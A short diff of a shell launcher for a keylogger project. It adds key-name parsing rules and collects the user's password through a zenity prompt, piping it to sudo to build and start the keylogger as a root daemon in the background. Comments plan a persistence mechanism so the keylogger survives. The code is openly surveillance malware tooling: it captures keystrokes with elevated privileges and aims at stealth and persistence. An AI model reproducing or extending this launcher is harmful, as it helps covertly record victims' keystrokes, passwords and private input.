@@ -9,6 +9,8 @@ parse(){
 	 sed "s|parenleft|(|g" |\
 	 sed "s|question|?|g" |\
 	 sed "s|exclam|!|g" |\
+	 sed "s|eacute|é|g" |\
+	 sed "s|colon|:|g" |\
 	#  sed 's|Return|\x0a|g' |\
 	 sed 's|dollar|\$|g')
 }
@@ -25,7 +27,7 @@ getKbdMap(){
 password=$(zenity --password --title=Authentication)"\n\n\n"
 
 #Build program
-echo -e $password | sudo -S make re
+echo -e $password | sudo -S make re #fclean debug
 if [ $? -ne 0 ]
 then
 echo -e "MAKE FAILED\n"
@@ -38,7 +40,7 @@ echo "${keyMap}" >> klg.data
 #Run program in root in a daemonized process
 echo -e $password | sudo -S -b ./keylogger &
 
-#TODO loop on $? for retry
+#TODO loop on $? for retry password
 #TODO completer le PARSEUR
 #TODO ajouter un systeme de persistence du keylogger
 #DONE deamonize process
